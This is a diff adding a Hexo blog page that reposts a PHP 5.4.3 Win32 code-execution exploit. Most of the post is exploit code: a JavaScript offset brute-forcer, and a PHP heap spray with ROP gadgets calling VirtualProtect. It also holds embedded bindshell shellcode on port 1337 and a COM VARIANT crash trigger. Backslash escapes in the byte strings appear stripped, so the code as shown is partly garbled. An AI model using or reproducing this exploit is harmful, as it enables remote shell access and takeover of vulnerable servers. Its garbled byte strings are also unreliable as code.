@@ -1,0 +1,837 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="php,code execution," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="// Exploit Title: PHP 5.4 (5.4.3) Code Execution 0day (Win32) // Exploit author: 0in (Maksymilian Motyl) // Email: 0in(dot)email(at)gmail.com // &amp;#42 Bug with Variant type parsing originally discovere">
+<meta name="keywords" content="php,code execution">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[转]PHP 5.4 (5.4.3) Code Execution (Win32)">
+<meta property="og:url" content="http://yoursite.com/2012/05/26/转-PHP-5-4-5-4-3-Code-Execution-Win32/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="// Exploit Title: PHP 5.4 (5.4.3) Code Execution 0day (Win32) // Exploit author: 0in (Maksymilian Motyl) // Email: 0in(dot)email(at)gmail.com // &amp;#42 Bug with Variant type parsing originally discovere">
+<meta property="og:updated_time" content="2018-02-26T05:36:35.267Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="[转]PHP 5.4 (5.4.3) Code Execution (Win32)">
+<meta name="twitter:description" content="// Exploit Title: PHP 5.4 (5.4.3) Code Execution 0day (Win32) // Exploit author: 0in (Maksymilian Motyl) // Email: 0in(dot)email(at)gmail.com // &amp;#42 Bug with Variant type parsing originally discovere">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2012/05/26/转-PHP-5-4-5-4-3-Code-Execution-Win32/"/>
+
+
+
+
+
+  <title>[转]PHP 5.4 (5.4.3) Code Execution (Win32) | Hexo</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Hexo</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Startseite
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archiv
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2012/05/26/转-PHP-5-4-5-4-3-Code-Execution-Win32/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">[转]PHP 5.4 (5.4.3) Code Execution (Win32)</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Veröffentlicht am</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2012-05-26T00:18:03+08:00">
+                2012-05-26
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">in</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/0day漏洞/" itemprop="url" rel="index">
+                    <span itemprop="name">0day漏洞</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <pre class="brush:php; toolbar: true; auto-links: true;">// Exploit Title: PHP 5.4 (5.4.3) Code Execution 0day (Win32)
+// Exploit author: 0in (Maksymilian Motyl)
+// Email: 0in(dot)email(at)gmail.com
+// &#42 Bug with Variant type parsing originally discovered by Condis
+// Tested on Windows XP SP3 fully patched (Polish)
+
+===================
+ offset-brute.html
+===================
+
+&lt;html&gt;&lt;body&gt;
+&lt;title&gt;0day&lt;/title&gt;
+&lt;center&gt;
+&lt;font size=7&gt;PHP 5.4.3 0day by 0in &amp; cOndis&lt;/font&gt;&lt;br&gt;
+&lt;textarea rows=50 cols=50 id="log"&gt;&lt;/textarea&gt;
+&lt;/center&gt;
+&lt;script&gt;
+function sleep(milliseconds) {
+  var start = new Date().getTime();
+  for (var i = 0; i &lt; 1e7; i++) {
+    if ((new Date().getTime() - start) &gt; milliseconds){
+      break;
+    }
+  }
+}
+function makeRequest(url, parameters)
+{
+    var xmlhttp = new XMLHttpRequest();
+    if (window.XMLHttpRequest) {
+        xmlhttp = new XMLHttpRequest();
+        if (xmlhttp.overrideMimeType) {
+            xmlhttp.overrideMimeType(’text/xml’);
+        }
+    } else if (window.ActiveXObject) {
+        // IE
+        try { xmlhttp = new ActiveXObject("Msxml2.XMLHTTP"); }
+        catch (e) {
+            try { xmlhttp = new ActiveXObject("Microsoft.XMLHTTP"); }
+            catch (e) {}
+        }
+    }
+
+    if (!xmlhttp) {
+        alert(’Giving up :( Cannot create an XMLHTTP instance’);
+        return false;
+    }
+
+    xmlhttp.open("GET",url,true);
+    xmlhttp.send(null);
+    return true;
+}
+test=document.getElementById("log");
+for(offset=0;offset&lt;300;offset++)
+{
+    log.value+="Trying offset:"+offset+"
+";
+    makeRequest("0day.php?offset="+offset);
+    sleep(500);
+}
+
+&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;
+
+===================
+     0day.php
+===================
+
+&lt;?php 
+
+$spray = str_repeat("x90",0x200); 
+$offset=$_GET[’offset’];
+// 775DF0Da   # ADD ESP,10 # RETN    &#42&#42 [ole32.dll] 
+$spray = substr_replace($spray, "xdaxf0x5dx77", (strlen($spray))&#42-1,(strlen($spray))&#42-1); 
+// :&gt; 0x048d0030
+$spray = substr_replace($spray, pack("L",0x048d0030+$offset), (strlen($spray)-0x8)&#42-1,(strlen($spray))&#42-1); 
+
+//0x7752ae9f (RVA : 0x0005ae7f) : # XCHG EAX,ESP # MOV ECX,468B0000 # OR AL,3 # RETN   [ole32.dll]
+$spray = substr_replace($spray, "x9fxaex52x77", (strlen($spray)-0x10)&#42-1,(strlen($spray))&#42-1); 
+
+// Adress of VirtualProtect 0x7c801ad4
+$spray = substr_replace($spray, "xd4x1ax80x7c", (strlen($spray)-0x14)&#42-1,(strlen($spray))&#42-1);
+
+//  LPVOID lpAddress  = 0x048d0060
+$spray = substr_replace($spray, pack("L",0x048d0060+$offset), (strlen($spray)-0x1c)&#42-1,(strlen($spray))&#42-1);
+
+// SIZE_T dwSize  = 0x01000000 
+$spray = substr_replace($spray, "x00x00x10x00", (strlen($spray)-0x20)&#42-1,(strlen($spray))&#42-1);
+
+// DWORD flNewProtect =  PAGE_EXECUTE_READWRITE (0x00000040) | 0xffffffc0 
+$spray = substr_replace($spray, "x40x00x00x00", (strlen($spray)-0x24)&#42-1,(strlen($spray))&#42-1);
+// __out  PDWORD lpflOldProtect = 0x04300070 | 0x105240000
+
+// 0x048d0068
+$spray = substr_replace($spray, pack("L",0x048d0068+$offset), (strlen($spray)-0x28)&#42-1,(strlen($spray))&#42-1);
+
+//0x77dfe8b4 : # XOR EAX,EAX # ADD ESP,18 # INC EAX # POP EBP # RETN 0C    &#42&#42 [ADVAPI32.dll]
+$spray = substr_replace($spray, "xb4xe8xdfx77", (strlen($spray)-0x18)&#42-1,4); 
+// Ret Address = 0x048d0080 
+$spray = substr_replace($spray, pack("L",0x048d0080+$offset), (strlen($spray)-0x48)&#42-1,4); 
+
+$stacktrack = "xbcx0cxb0xc0x00"; 
+// Universal win32 bindshell on port 1337 from metasploit
+$shellcode = $stacktrack."x33xc9x83xe9xb0".
+  "x81xc4xd0xfdxffxff".
+  "xd9xeexd9x74x24xf4x5bx81x73x13x1d".
+  "xccx32x69x83xebxfcxe2xf4xe1xa6xd9x24xf5x35xcdx96".
+  "xe2xacxb9x05x39xe8xb9x2cx21x47x4ex6cx65xcdxddxe2".
+  "x52xd4xb9x36x3dxcdxd9x20x96xf8xb9x68xf3xfdxf2xf0".
+  "xb1x48xf2x1dx1ax0dxf8x64x1cx0exd9x9dx26x98x16x41".
+  "x68x29xb9x36x39xcdxd9x0fx96xc0x79xe2x42xd0x33x82".
+  "x1exe0xb9xe0x71xe8x2ex08xdexfdxe9x0dx96x8fx02xe2".
+  "x5dxc0xb9x19x01x61xb9x29x15x92x5axe7x53xc2xdex39".
+  "xe2x1ax54x3ax7bxa4x01x5bx75xbbx41x5bx42x98xcdxb9".
+  "x75x07xdfx95x26x9cxcdxbfx42x45xd7x0fx9cx21x3ax6b".
+  "x48xa6x30x96xcdxa4xebx60xe8x61x65x96xcbx9fx61x3a".
+  "x4ex9fx71x3ax5ex9fxcdxb9x7bxa4x37x50x7bx9fxbbx88".
+  "x88xa4x96x73x6dx0bx65x96xcbxa6x22x38x48x33xe2x01".
+  "xb9x61x1cx80x4ax33xe4x3ax48x33xe2x01xf8x85xb4x20".
+  "x4ax33xe4x39x49x98x67x96xcdx5fx5ax8ex64x0ax4bx3e".
+  "xe2x1ax67x96xcdxaax58x0dx7bxa4x51x04x94x29x58x39".
+  "x44xe5xfexe0xfaxa6x76xe0xffxfdxf2x9axb7x32x70x44".
+  "xe3x8ex1exfax90xb6x0axc2xb6x67x5ax1bxe3x7fx24x96".
+  "x68x88xcdxbfx46x9bx60x38x4cx9dx58x68x4cx9dx67x38".
+  "xe2x1cx5axc4xc4xc9xfcx3axe2x1ax58x96xe2xfbxcdxb9".
+  "x96x9bxcexeaxd9xa8xcdxbfx4fx33xe2x01xf2x02xd2x09".
+  "x4ex33xe4x96xcdxccx32x69";
+
+$spray = substr_replace($spray,$shellcode, (strlen($spray)-0x50)&#42-1,(strlen($shellcode))); 
+$fullspray="";
+for($i=0;$i&lt;0x4b00;$i++)
+{
+    $fullspray.=$spray;
+}
+$j=array();
+$e=array();
+$b=array();
+$a=array();
+$c=array();
+
+array_push($j,$fullspray);
+array_push($e,$fullspray."W");
+array_push($b,$fullspray."A");
+array_push($a,$fullspray."S");
+array_push($c,$fullspray."!");
+
+$vVar = new VARIANT(0x048d0038+$offset); 
+// Shoot him
+com_print_typeinfo($vVar); //CRASH -&gt; 102F3986   FF50 10          CALL DWORD PTR DS:[EAX+10]
+
+echo $arr;
+
+echo $spray;
+
+?&gt;</pre> 
+
+<hr>
+<p>转至：90sec.org</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/php/" rel="tag"># php</a>
+          
+            <a href="/tags/code-execution/" rel="tag"># code execution</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2012/05/24/PHPCMS-v9-代码分析之phpsso-php/" rel="next" title="PHPCMS v9 代码分析之phpsso.php">
+                <i class="fa fa-chevron-left"></i> PHPCMS v9 代码分析之phpsso.php
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2012/05/26/转-PHP-CGI-Argument-Injection-Exploit-CVE-2012-1823/" rel="prev" title="[转]PHP CGI Argument Injection Exploit CVE-2012-1823">
+                [转]PHP CGI Argument Injection Exploit CVE-2012-1823 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+
+      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">John Doe</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">165</span>
+                  <span class="site-state-item-name">Artikel</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                
+                  <span class="site-state-item-count">14</span>
+                  <span class="site-state-item-name">Kategorien</span>
+                
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">183</span>
+                  <span class="site-state-item-name">Tags</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">John Doe</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Erstellt mit  <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
